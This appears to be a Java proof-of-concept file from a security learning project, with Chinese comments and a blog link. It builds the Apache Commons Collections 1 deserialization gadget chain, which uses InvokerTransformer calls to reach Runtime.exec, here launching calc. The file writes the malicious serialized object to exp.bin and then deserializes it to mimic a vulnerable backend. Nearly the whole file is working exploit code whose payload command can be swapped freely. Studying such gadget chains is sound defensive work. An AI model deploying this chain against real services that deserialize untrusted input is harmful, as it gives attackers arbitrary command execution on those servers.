package Seri.CCGadgets;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.util.HashMap;
import java.util.Map;

// 博客地址：https://www.fireline.fun/article/page-18#3a8204bf92004dcd83910dfa6d6f6587
public class yhy_CC1 {
    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IOException {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer(
                        "getMethod",
                        new Class[]{String.class,Class[].class},
                        new Object[]{"getRuntime", null}),
                new InvokerTransformer(
                        "invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, null}),
                new InvokerTransformer(
                        "exec",
                        new Class[]{String.class},
                        new Object[] {"calc"}),
        };
        Transformer transformerChain = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        innerMap.put("value", "xxxx");
        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
//        outerMap.put("test", new Object());

        // AnnotationInvocationHandler 是private方法，需要反射获取
        Class anno = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor annoConstructor = anno.getDeclaredConstructor(Class.class, Map.class);
        annoConstructor.setAccessible(true);
        // 构造方法为(Annotation ,Map)
        Object obj = annoConstructor.newInstance(Retention.class, outerMap);

        // 将上述过程序列化
        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./exp.bin"));
        outputStream.writeObject(obj);
        outputStream.close();

        // 模拟目标后端程序接受到的序列化后的数据
        FileInputStream fi = new FileInputStream("./exp.bin");
        ObjectInputStream fin = new ObjectInputStream(fi);
        fin.readObject();

    }
}
